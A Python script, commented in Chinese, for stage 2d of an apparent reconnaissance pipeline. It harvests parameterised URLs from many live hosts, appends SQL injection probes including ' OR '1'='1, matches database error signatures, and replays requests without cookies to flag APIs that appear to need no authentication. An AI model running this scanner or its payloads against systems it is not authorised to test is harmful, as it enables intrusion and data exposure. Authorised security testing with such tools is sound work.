# -*- coding: utf-8 -*-
"""
阶段 2d：参数级漏洞线索探测 —— SQL 注入报错 / 未鉴权 API。

范围性做法：
  1) 从存活站点首页 + robots.txt 抽取真实带参 URL（不臆造接口）
  2) 对每个参数的原值追加无害探针（单引号/双引号/括号/反斜杠），比对响应差异
  3) 命中 SQL 错误特征 → 记为候选（**只是线索**，是否成立由阶段 3 完整验证）
  4) 去掉 Cookie 重放 API 类 URL → 未鉴权返回数据记为候选

最小影响：只做单请求追加字符，不用 sleep/时间盲注压测，不提交任何数据。
"""
import re
import json
import sys
import time
import random
import string
import argparse
import concurrent.futures as cf
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

import requests
import urllib3

urllib3.disable_warnings()
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
TIMEOUT = 9

SQL_ERR = [
    (r"You have an error in your SQL syntax", "MySQL"),
    (r"Warning:\s+mysql_[a-z_]+\(\)", "MySQL"),
    (r"MySQL server version for the right syntax", "MySQL"),
    (r"ORA-\d{4,5}", "Oracle"),
    (r"Microsoft OLE DB Provider for SQL Server", "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"SQLServerException|com\.microsoft\.sqlserver", "MSSQL"),
    (r"PostgreSQL.{0,40}ERROR|pg_query\(\)", "PostgreSQL"),
    (r"org\.postgresql\.util\.PSQLException", "PostgreSQL"),
    (r"SQLiteException|sqlite3\.OperationalError|near \".*?\": syntax error", "SQLite"),
    (r"org\.hibernate\.exception|HibernateException", "Hibernate/JPA"),
    (r"com\.mysql\.jdbc|java\.sql\.SQLException", "Java JDBC"),
    (r"MyBatis|PersistentObjectException", "MyBatis"),
    (r"nested exception is", "Spring/JDBC"),
    (r"syntax error at or near", "PostgreSQL"),
    (r" SQLException:", "JDBC"),
    (r"SQLSTATE\[", "PDO/PHP"),
    (r"supplied argument is not a valid MySQL", "PHP/MySQL"),
]

# 精简探针：单引号/双引号/括号 可直接触发数据库语法错误；布尔探针用于差异比对。
# 不用 sleep 类时间盲注（避免对生产站造成负载，也符合最小影响原则）。
PROBES = ["'", '"', ")'", "' OR '1'='1"]

# 只对"像业务参数"的名字做注入，避免对 page=1 这类无意义参数浪费请求
INTERESTING_PARAM = re.compile(
    r"(?i)^(id|uid|user_?id|userid|pid|gid|cid|oid|order_?id|keyword|kw|q|query|search|"
    r"name|title|type|cat|category|sort|order|page|size|limit|start|end|date|city|area|"
    r"phone|mobile|email|account|token|code|url|file|path|dir|callback|redirect)$")

LINK_RE = re.compile(r"""(?:href|action|url|src)\s*=\s*["']([^"']+\?[^"']*=)""", re.I)
JSON_API_RE = re.compile(r"""['"]/(?:api|v\d|rest|openapi)/[A-Za-z0-9_\-/{}.]{2,60}['"]""")


def collect_urls(host):
    """首页 + robots.txt → 带参 URL"""
    sess = requests.Session()
    base = None
    html = ""
    for scheme in ("https", "http"):
        try:
            r = sess.get(f"{scheme}://{host}", timeout=TIMEOUT, verify=False, headers={"User-Agent": UA})
            if r.status_code == 200:
                base = r.url
                html = r.text[:500000]
                break
        except Exception:
            continue
    if not base:
        return []
    urls = set()
    for m in LINK_RE.finditer(html):
        u = m.group(1)
        if u.startswith("http"):
            if urlparse(u).netloc.endswith(host.split(":")[0]):
                urls.add(u)
        else:
            urls.add(base.rstrip("/") + "/" + u.lstrip("/"))
    try:
        rr = sess.get(urlparse(base).scheme + "://" + host + "/robots.txt", timeout=TIMEOUT,
                      verify=False, headers={"User-Agent": UA})
        if rr.status_code == 200:
            for line in rr.text.splitlines()[:200]:
                line = line.strip()
                if line.lower().startswith(("disallow:", "allow:", "sitemap:")):
                    p = line.split(":", 1)[1].strip()
                    if "=" in p:
                        urls.add(base.rstrip("/") + "/" + p.lstrip("/"))
    except Exception:
        pass
    return sorted(urls)[:25]


def test_url(url):
    """对单个 URL 做参数注入 + 未鉴权重放"""
    hits = []
    sess = requests.Session()
    try:
        r0 = sess.get(url, timeout=TIMEOUT, verify=False, headers={"User-Agent": UA})
    except Exception:
        return hits
    if r0.status_code != 200:
        return hits
    base_len = len(r0.content)
    pr = urlparse(url)
    qs = parse_qsl(pr.query, keep_blank_values=True)
    if not qs:
        return hits

    qs = [(k, v) for k, v in qs if INTERESTING_PARAM.match(k)][:2] or qs[:1]
    for key, val in qs:
        for probe in PROBES:
            newqs = [(k, (val + probe if k == key else v)) for k, v in qs]
            newurl = urlunparse((pr.scheme, pr.netloc, pr.path, pr.params, urlencode(newqs), pr.fragment))
            try:
                r = sess.get(newurl, timeout=TIMEOUT, verify=False, headers={"User-Agent": UA})
            except Exception:
                continue
            if r.status_code == 200:
                txt = r.text[:20000]
                for pat, db in SQL_ERR:
                    m = re.search(pat, txt, re.I)
                    if m:
                        hits.append({
                            "kind": "SQL 报错特征", "url": newurl, "param": key, "db": db,
                            "evidence": m.group(0)[:120], "status": r.status_code,
                        })
                        break
    # 未鉴权重放：去掉 Cookie 与 Referer
    try:
        r2 = requests.get(url, timeout=TIMEOUT, verify=False, headers={"User-Agent": UA})
        if r2.status_code == 200 and abs(len(r2.content) - base_len) < max(128, base_len * 0.05):
            body = r2.text[:3000]
            if re.search(r'"(?:id|uid|user|mobile|phone|email|token|name)"\s*:', body):
                hits.append({
                    "kind": "API 疑似未鉴权", "url": url, "param": "", "db": "",
                    "evidence": re.search(r'"(?:id|uid|user|mobile|phone|email|token|name)"\s*:\s*[^,}]{1,40}',
                                          body).group(0)[:120], "status": 200,
                })
    except Exception:
        pass
    return hits


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--alive", default="../recon/alive.json")
    ap.add_argument("--out", default="../recon/param-hits.json")
    ap.add_argument("--workers", type=int, default=10)
    ap.add_argument("--limit", type=int, default=0)
    a = ap.parse_args()

    data = json.load(open(a.alive, encoding="utf-8"))
    meta = {d["host"]: (d.get("tier", ""), d.get("vendor", ""), d.get("root", "")) for d in data}
    hosts = [d["host"] for d in data]
    if a.limit:
        hosts = hosts[:a.limit]
    print(f"[*] 采集 {len(hosts)} 主机的带参 URL ...", file=sys.stderr)

    all_urls = []
    done = 0
    t0 = time.time()
    with cf.ThreadPoolExecutor(max_workers=a.workers) as ex:
        for host, urls in zip(hosts, ex.map(collect_urls, hosts)):
            done += 1
            for u in urls:
                all_urls.append((host, u))
            if done % 50 == 0:
                print(f"    采集 {done}/{len(hosts)} url={len(all_urls)} ({time.time()-t0:.0f}s)",
                      file=sys.stderr)
    print(f"[*] 共 {len(all_urls)} 个带参 URL，开始注入探测 ...", file=sys.stderr)

    out = []
    done = 0
    with cf.ThreadPoolExecutor(max_workers=a.workers) as ex:
        futs = {ex.submit(test_url, u): (h, u) for h, u in all_urls}
        for f in cf.as_completed(futs):
            h, u = futs[f]
            done += 1
            try:
                hits = f.result()
            except Exception:
                hits = []
            for x in hits:
                x["host"] = h
                x["tier"], x["vendor"], x["root"] = meta.get(h, ("", "", ""))
                out.append(x)
            if done % 100 == 0:
                print(f"    {done}/{len(all_urls)} hits={len(out)} ({time.time()-t0:.0f}s)", file=sys.stderr)

    json.dump(out, open(a.out, "w", encoding="utf-8"), ensure_ascii=False, indent=1)
    print(f"[✓] 参数级候选 {len(out)} 条 → {a.out}")
    from collections import Counter
    for k, v in Counter(x["kind"] for x in out).most_common():
        print(f"    {k}: {v}")


if __name__ == "__main__":
    main()
